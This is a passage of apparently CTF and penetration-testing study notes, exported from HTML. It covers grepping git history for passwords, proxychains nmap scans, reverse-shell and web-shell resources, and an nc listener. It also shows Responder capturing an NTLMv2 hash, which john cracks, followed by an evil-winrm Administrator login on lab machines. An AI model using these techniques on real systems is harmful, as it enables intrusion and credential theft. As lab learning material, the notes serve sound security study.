-webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_108-0"><li class="c0 c5 li-bullet-0"><span class="c1">Each commit has its own unique identifier and if you see a commit you want to display, you can just use, &ldquo;git show &lt;commit id&gt;</span></li></ul><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_108-0"><li class="c0 c5 li-bullet-0"><span class="c1">If you want to view like the last 100 commits at once, you can use:</span></li></ul><p class="c4 c5"><span class="c33">Note: To back out, you can just type the letter q:</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p class="c4 c5"><span class="c1">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped/.git]</span></p><p class="c4 c5"><span class="c1">&#9492;&#9472;$ git log -p &ndash;100</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 472.00px; height: 52.60px;"><img alt="" src="images/image119.jpg" style="width: 472.00px; height: 52.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_109-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">You can also grep for like the term &quot;password&quot;:</span></li></ul><p class="c4 c5"><span class="c1">&#9484;&#9472;&#9472;(kali&#12927;kali)-[~/GitHappens/Dumped/.git]</span></p><p class="c4 c5"><span class="c1">&#9492;&#9472;$ git log -p -100 | grep password</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 415.00px; height: 53.67px;"><img alt="" src="images/image124.jpg" style="width: 415.00px; height: 53.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></li></ul>






</li>
</ul>
<ul>
  <li><B>ProxyChains</B></li>
<ul class="c8 lst-kix_list_91-0"><li class="c0 c5 li-bullet-0"><span class="c9">ProxyChains may find open ports that a plain nMap scan will not.</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.128.242</span></p>

<p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 714.67px; height: 195.07px;"><img alt="" src="images/image122.png" style="width: 714.67px; height: 195.07px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span>
<BR>
<BR>
<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 607.53px; height: 249.33px;">
<img alt="" src="images/image114.png" style="width: 607.53px; height: 249.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p>

<p class="c4 c5"><span class="c1">-Same scan as an open port only scan:</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 610.00px; height: 203.33px;"><img alt="" src="images/image112.png" style="width: 610.00px; height: 203.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></li></ul>






</li>
</ul>
<ul>
  <li><B>Website Scanners:</B></li>
<ul class="c8 lst-kix_list_110-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Website Scanners can help us see what's behind the curtain:</span></li></ul>
<BR>
<ul class="c8 lst-kix_list_111-0 start"><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://wappalyzer.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511501123&amp;usg=AOvVaw2KeBNIl43Y280bROAIuedR">https://wappalyzer.com</a></span></li><li class="c0 c5 li-bullet-0"><span class="c2">NetCraft: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://sitereport.netcraft.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511501584&amp;usg=AOvVaw2DC2zjJh3S7xUh4Rw57t8g">https://sitereport.netcraft.com</a></span></li><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://sitecheck.sucuri.net/&amp;sa=D&amp;source=editors&amp;ust=1699590511501930&amp;usg=AOvVaw0GdMOMwYTbXELcyKT7I7RK">https://sitecheck.sucuri.net</a></span></li><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://builtwith.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511502262&amp;usg=AOvVaw01pkIjrzBLTihn_IIHb586">https://BuiltWith.com</a></span></li><li class="c0 c5 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://requestcatcher.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511502574&amp;usg=AOvVaw2NqYLG4H5VjijRuYf4XO_p">https://requestcatcher.com</a></span></li></ul>





</li>
</ul>
<ul>
  <li><B>Reverse Shells:</B></li>
<ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">Reverse shells are often leveraged by attackers due to their ability to circumvent firewalls and instead take advantage of a vulnerability on the machine they want to access, then establishing a call-back from that machine to their own.</span></li></ul>
<BR>
<ul class="c8 lst-kix_list_78-0"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/swisskyrepo/PayloadsAllTheThings&amp;sa=D&amp;source=editors&amp;ust=1699590511503053&amp;usg=AOvVaw2lNMNjm6v2sRjFbxqkYROO">https://github.com/swisskyrepo/PayloadsAllTheThings</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://gitlab.com/kalilinux/packages/webshells&amp;sa=D&amp;source=editors&amp;ust=1699590511503406&amp;usg=AOvVaw3EQh50gZWGfO8bSQ8uFH4j">https://gitlab.com/kalilinux/packages/webshells</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://pentestmonkey.net/tools/web-shells/php-reverse-shell&amp;sa=D&amp;source=editors&amp;ust=1699590511503738&amp;usg=AOvVaw2chiuYZsqMLRZE5wuA8cwK">https://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://www.revshells.com/&amp;sa=D&amp;source=editors&amp;ust=1699590511504058&amp;usg=AOvVaw0wWLLJKCYU2ZuEwrXrQkrI">https://www.revshells.com</a></span></li></ul><p class="c3"><span class="c2"></span></p><ul class="c8 lst-kix_list_112-0 start"><li class="c0 li-bullet-0"><span class="c2">Not all reverse shells are compatible with both UNIX-like and Windows systems with no modification. &nbsp;Here&rsquo;s one that works for both:</span></li></ul><ul class="c8 lst-kix_list_113-0 start"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/WhiteWinterWolf/wwwolf-php-webshell&amp;sa=D&amp;source=editors&amp;ust=1699590511504564&amp;usg=AOvVaw17qlq56GSB43Yorlo5ON29">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</a></span></li></ul><p class="c3"><span class="c2"></span></p><ul class="c8 lst-kix_list_112-0"><li class="c0 li-bullet-0"><span class="c2">To set up the listening port for the reverse shell, here&rsquo;s an example with a reverse shell set to port 4444. &nbsp;Be mindful of your port though, as boxes become more difficult, it&#39;s good to pick a port where you know a service is already running, because if it&#39;s already running, there&#39;s a good chance traffic is allowed to flow both ways. &nbsp;For example, on this machine, we saw with Nmap that RDP 3389 was open, so that port might be a good one for our reverse shell too.</span></li></ul><p class="c3"><span class="c2"></span></p><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 318.00px; height: 71.00px;"><img alt="" src="images/image117.jpg" style="width: 318.00px; height: 71.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4"><span class="c2">&#9484;&#9472;&#9472;(root&#12927;kali)-[/home/kali/sweetrice]</span></p><p class="c4"><span class="c2">&#9492;&#9472;# nc -lvnp 4444</span></p><p class="c3 c5"><span class="c2"></span></li></ul>






</li>
</ul>
<ul>
  <li><B>Web Shells</B></li>
<ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">A web shell is a shell-like interface that enables a web server to be remotely accessed.</span></li></ul>
<BR>
<ul class="c8 lst-kix_list_78-0"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/swisskyrepo/PayloadsAllTheThings&amp;sa=D&amp;source=editors&amp;ust=1699590511505430&amp;usg=AOvVaw2hmPF9tbj63kgGvhFg7kAw">https://github.com/swisskyrepo/PayloadsAllTheThings</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/tennc/webshell&amp;sa=D&amp;source=editors&amp;ust=1699590511505749&amp;usg=AOvVaw2IIkgzFAWhdZWcAkSKmd7q">https://github.com/tennc/webshell</a></span></li><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/BlackArch/webshells&amp;sa=D&amp;source=editors&amp;ust=1699590511506083&amp;usg=AOvVaw1pOSmmnKoEAVbU7VMLgeST">https://github.com/BlackArch/webshells</a></span></li></ul><p class="c3 c5"><span class="c2"></span></li></ul>





</li>
</ul>
<ul>
  <li><B>RDP (Remote Desktop Protocol)</B></li>
<ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">RDP provides a user with a graphical interface to connect to another computer over a network connection.</span></li></ul>
<BR>
<ul class="c8 lst-kix_list_114-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">For RDP, we can use the command: xfreerdp /u:wade /v:10.10.213.120</span></li></ul><p class="c3 c5"><span class="c2"></span></li></ul>






</li>
</ul>
<ul>
  <li><B>Responder</B></li>
<ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">Responder is a great tool for recon:</span></li></ul>
<BR>
<ul class="c8 lst-kix_list_78-0"><li class="c0 li-bullet-0"><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/swisskyrepo/PayloadsAllTheThings&amp;sa=D&amp;source=editors&amp;ust=1699590511506735&amp;usg=AOvVaw09Nr2xRi4nE5hDm08X7zZc">https://github.com/swisskyrepo/PayloadsAllTheThings</a></span></li></ul><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_115-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We can run Responder on our Tunnel0 (zero):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 587.00px; height: 205.00px;"><img alt="" src="images/image147.jpg" style="width: 587.00px; height: 205.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_116-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Next, we can grab our Responder IP:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 46.00px;"><img alt="" src="images/image145.jpg" style="width: 624.00px; height: 46.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_117-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We then plug that ip into our browser using the URL below:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 97.00px;"><img alt="" src="images/image151.jpg" style="width: 624.00px; height: 97.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_118-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Once we do that, we&rsquo;re given a hash:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 147.00px;"><img alt="" src="images/image149.jpg" style="width: 624.00px; height: 147.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">[+] Listening for events... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p class="c4 c5"><span class="c2">[SMB] NTLMv2-SSP Client &nbsp; : 10.129.77.70</span></p><p class="c4 c5"><span class="c2">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span></p><p class="c4 c5"><span class="c2">[SMB] NTLMv2-SSP Hash &nbsp; &nbsp; : Administrator::RESPONDER:ebaf7736556055e4:45FD988949712C0BFB6F9B0BD92EBC79:010100000000000080B0DA48E838D9017114CC6480F4388B0000000002000800550045005A00310001001E00570049004E002D005100450041003800300049004400520057004600480004003400570049004E002D00510045004100380030004900440052005700460048002E00550045005A0031002E004C004F00430041004C0003001400550045005A0031002E004C004F00430041004C0005001400550045005A0031002E004C004F00430041004C000700080080B0DA48E838D901060004000200000008003000300000000000000001000000002000005A4C8E36F8C57F769D30D7FDD526ADF95003316A3D3288F3D458C95488DD35E40A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320036000000000000000000</span></p><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_119-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Next, open a text editor of your choice, and paste in the hash, then name it &ldquo;hash&rdquo; and save/close it:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 162.00px;"><img alt="" src="images/image139.jpg" style="width: 624.00px; height: 162.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_120-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Now, let&rsquo;s crack it w/ john (John the Ripper):</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 184.00px;"><img alt="" src="images/image137.jpg" style="width: 624.00px; height: 184.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;# john --wordlist=/usr/share/wordlists/rockyou.txt Hash</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9 c36">-Result is &ldquo;badminton&rdquo;</span></p><p class="c3 c5"><span class="c2"></span></li></ul>






</li>
</ul>
<ul>
  <li><B>EvilWinRM</B></li>
<ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">Can be used to load in-memory scripts, dll files, and so much more.</span></li></ul><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_121-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">We were asked to remote into our target using a Windows service running on the box, for that we use &ldquo;evil-winrm&rdquo; with our username of &ldquo;Administrator&rdquo; and the password we now know, &ldquo;badminton&rdquo;:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 95.00px;"><img alt="" src="images/image143.jpg" style="width: 624.00px; height: 95.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">&#9492;&#9472;# evil-winrm -i 10.129.77.i0 -u Administrator -p badminton</span></p><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_122-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">After we have a shell, we poke around to find the flag:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 781.00px;"><img alt="" src="images/image141.jpg" style="width: 624.00px; height: 781.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_123-0 start"><li class="c0 c5 li-bullet-0"><span class="c19">Some of the commands I used are below:</span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span class="c2">*Evil-WinRM* PS C:\Users\Administrator&gt; cd ..</span></p><p class="c4 c5"><span class="c2">*Evil-WinRM* PS C:\Users&gt; ls</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">*Evil-WinRM* PS C:\Users&gt; cd mike</span></p><p class="c4 c5"><span class="c2">*Evil-WinRM* PS C:\Users\mike&gt; ls</span></p><p class="c4 c5"><p class="c4 c5"><span class="c2">&nbsp; &nbsp; Directory: C:\Users\mike</span></p><p class="c4 c5"><span class="c2">Mode &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LastWriteTime &nbsp; &nbsp; &nbsp; &nbsp; Length Name</span></p><p class="c4 c5"><span class="c2">---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------------- &nbsp; &nbsp; &nbsp; &nbsp; ------ ----</span></p><p class="c4 c5"><span class="c2">d----- &nbsp; &nbsp; &nbsp; &nbsp; 3/10/2022 &nbsp; 4:51 AM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Desktop</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">*Evil-WinRM* PS C:\Users\mike&gt; cd Desktop</span></p><p class="c4 c5"><span class="c2">*Evil-WinRM* PS C:\Users\mike\Desktop&gt; ls</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">&nbsp; &nbsp; Directory: C:\Users\mike\Desktop</span></p><p class="c4 c5"><span class="c2">Mode &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LastWriteTime &nbsp; &nbsp; &nbsp; &nbsp; Length Name</span></p><p class="c4 c5"><span class="c2">---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ------------- &nbsp; &nbsp; &nbsp; &nbsp; ------ ----</span></p><p class="c4 c5"><span class="c2">-a---- &nbsp; &nbsp; &nbsp; &nbsp; 3/10/2022 &nbsp; 4:50 AM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 32 flag.txt</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9 c36">*Evil-WinRM* PS C:\Users\mike\Desktop&gt; cat flag.txt</span></p><p class="c4 c5"><span class="c9 c36">ea81b7afddd03efaa0945333ed147fac</span></p><p class="c4 c5"><span class="c9 c36">*Evil-WinRM* PS C:\Users\mike\Desktop&gt;</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">System Enumeration:</span></li></ul><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can type &ldquo;hostname&rdquo; to find out what our hostname is. This can come in handy for CTF&rsquo;s because, for example, if the hostname is &ldquo;blue&rdquo;, a vulnerability on that machine might be &ldquo;Eternal Blue&rdquo;:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 190.00px; height: 63.00px;"><img alt="" src="images/image133.jpg" style="width: 190.00px; height: 63.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">&ldquo;uname -a&rdquo; will tell us what Kernel the machine is running, which will in turn help us search for exploits against that box:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 708.53px; height: 60.53px;"><img alt="" src="images/image132.jpg" style="width: 708.53px; height: 60.53px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">&ldquo;cat /proc/version&rdquo; will tell us similar information:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 710.00px; height: 59.13px;"><img alt="" src="images/image90.jpg" style="width: 710.00px; height: 59.13px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can just copy and pasta the Linux Debian version:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 709.07px; height: 65.00px;"><img alt="" src="images/image83.jpg" style="width: 709.07px; height: 65.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">Then we can plug that into Google and see if there are any exploits/vulns against it:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 699.93px; height: 331.00px;"><img alt="" src="images/image82.jpg" style="width: 699.93px; height: 331.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 706.00px; height: 288.27px;"><img alt="" src="images/image87.jpg" style="width: 706.00px; height: 288.27px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can look at the etc issue, and see the distribution by typing &ldquo;cat /etc/issue&rdquo;:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 240.00px; height: 83.00px;"><img alt="" src="images/image85.jpg" style="width: 240.00px; height: 83.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">If we want a quick look at the architecture, we can run &ldquo;lscpu&rdquo;. &nbsp;One example of how this can be useful is, if you find an exploit but it states it will only work on architectures with more than one core, and your target has a single core, then you know not to even try that particular exploit:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 301.00px; height: 333.00px;"><img alt="" src="images/image76.jpg" style="width: 301.00px; height: 333.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">If we want to check what services are running, we can type &ldquo;ps aux&rdquo;&rdquo;</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 225.00px; height: 26.47px;"><img alt="" src="images/image74.jpg" style="width: 225.00px; height: 26.47px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c19"></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c19">The Results are listed in a chronological order from which they were issued, so we can see the most recent command we ran (&ldquo;ps aux&rdquo;) down at the very bottom of the results:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 711.00px; height: 474.00px;"><img alt="" src="images/image80.jpg" style="width: 711.00px; height: 474.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">We see an nginx server running with www data:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 707.00px; height: 25.07px;"><img alt="" src="images/image78.jpg" style="width: 707.00px; height: 25.07px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">We see Apache is running, so most likely there&rsquo;s a Web Server running on there, which a simple check confirms:</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 536.80px; height: 200.13px;"><img alt="" src="images/image71.jpg" style="width: 536.80px; height: 200.13px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_38-0"><li class="c0 c5 li-bullet-0"><span class="c9">We see &ldquo;root&rdquo; is running &ldquo;chron&rdquo;, so there must be 